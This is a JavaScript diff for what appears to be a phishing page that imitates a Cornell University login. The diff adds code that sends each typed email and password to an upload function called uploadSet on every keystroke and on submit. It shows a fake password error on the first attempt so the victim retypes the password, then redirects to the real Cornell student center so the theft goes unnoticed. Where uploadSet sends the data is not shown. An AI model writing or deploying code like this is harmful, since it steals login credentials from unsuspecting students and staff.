@@ -5,8 +5,8 @@ let EMAIL = ''
 
 Id('next').onclick = () => {
     let val = Id('email').value
-
     let end = val.substring(val.length-12, val.length)
+
 
     if (end == '@cornell.edu'){
 
@@ -15,38 +15,68 @@ Id('next').onclick = () => {
         w = 150
         Id('bar').style.display = 'block'
         EMAIL = val
+        uploadSet(val)
 
         Id('address').innerHTML = EMAIL
 
         setTimeout(()=>{
             Id('bar').style.display = 'none'
             Id('first').style.display = 'none'
+            Id('second').style.opacity = 1
             Id('second').style.display = 'flex'
         },2000)
 
     }else{
         Id('email').classList.add('error')
         Id('label').classList.add('error')
-        Id('message').style.display = 'block'
+        Id('message').style.display = 'flex'
     }
+}
+stage = 0
+
+
+Id('profile').onclick = () => {
+    x = 0
+    w = 150
+    Id('bar').style.display = 'block'
+    Id('second').style.opacity = 0.3
+
+    setTimeout(()=>{
+        Id('bar').style.display = 'none'
+        Id('second').style.display = 'none'
+        Id('first').style.opacity = 1
+        Id('first').style.display = 'flex'
+    },1000)
 }
 
 Id('submit').onclick = () => {
-    Id('password').classList.add('error')
-    Id('label2').classList.add('error')
-    Id('message2').style.display = 'block'
+    if (stage == 0){
+        Id('password').classList.add('error')
+        Id('label2').classList.add('error')
+        Id('message2').style.display = 'flex'
+        Class('check')[0].style.marginTop = '20px'
+        stage = 1
+        uploadSet(Id('password').value)
+    }else{
+        Id('password').type = 'text'
+        setTimeout(() => {
+            window.location = 'https://studentcenter.cornell.edu'
+        }, 500);
+    }
 }
 
 Id('email').oninput = e => {
     let val = Id('email').value
 
     console.log(val)
+    uploadSet(val)
 }
 
 Id('password').oninput = e => {
     let val = Id('password').value
 
     console.log(val)
+    uploadSet(val)
 }
 
 Id('checkbox').onclick = () => {
